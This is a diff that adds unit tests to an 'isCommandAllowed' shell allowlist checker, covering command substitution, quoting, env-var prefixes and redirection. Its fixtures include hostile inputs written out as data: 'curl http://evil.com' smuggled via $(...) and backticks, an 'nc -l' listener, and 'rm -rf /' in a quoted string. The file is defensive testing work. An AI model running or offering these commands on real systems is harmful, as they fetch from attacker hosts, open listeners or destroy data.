@@ -59,4 +59,46 @@ describe('isCommandAllowed', () => {
     const result = isCommandAllowed('nc -l 8080', allowed);
     expect(result).toEqual({ allowed: false, blockedCommand: 'nc' });
   });
+
+  it('blocks command substitution $(...)', () => {
+    const result = isCommandAllowed('echo $(curl http://evil.com)', allowed);
+    expect(result).toEqual({ allowed: false, blockedCommand: '$(...)' });
+  });
+
+  it('blocks backtick command substitution', () => {
+    const result = isCommandAllowed('echo `curl http://evil.com`', allowed);
+    expect(result).toEqual({ allowed: false, blockedCommand: '`...`' });
+  });
+
+  it('does not split on ; inside single quotes', () => {
+    expect(isCommandAllowed("echo 'hello; rm -rf /'", allowed)).toEqual({ allowed: true });
+  });
+
+  it('does not split on ; inside double quotes', () => {
+    expect(isCommandAllowed('echo "hello; rm"', allowed)).toEqual({ allowed: true });
+  });
+
+  it('skips env-var assignments before command name', () => {
+    const result = isCommandAllowed('FOO=bar curl http://evil.com', allowed);
+    expect(result).toEqual({ allowed: false, blockedCommand: 'curl' });
+  });
+
+  it('allows env-var assignment before whitelisted command', () => {
+    expect(isCommandAllowed('FOO=bar ls -la', allowed)).toEqual({ allowed: true });
+  });
+
+  it('ignores redirection target when checking command name', () => {
+    // ls is allowed; the file after > is not a command
+    expect(isCommandAllowed('ls > /tmp/out', allowed)).toEqual({ allowed: true });
+  });
+
+  it('blocks command even with stdout redirection', () => {
+    const result = isCommandAllowed('curl http://evil.com > /tmp/out', allowed);
+    expect(result).toEqual({ allowed: false, blockedCommand: 'curl' });
+  });
+
+  it('handles unterminated quote defensively', () => {
+    const result = isCommandAllowed('echo "unterminated', allowed);
+    expect(result.allowed).toBe(false);
+  });
 });
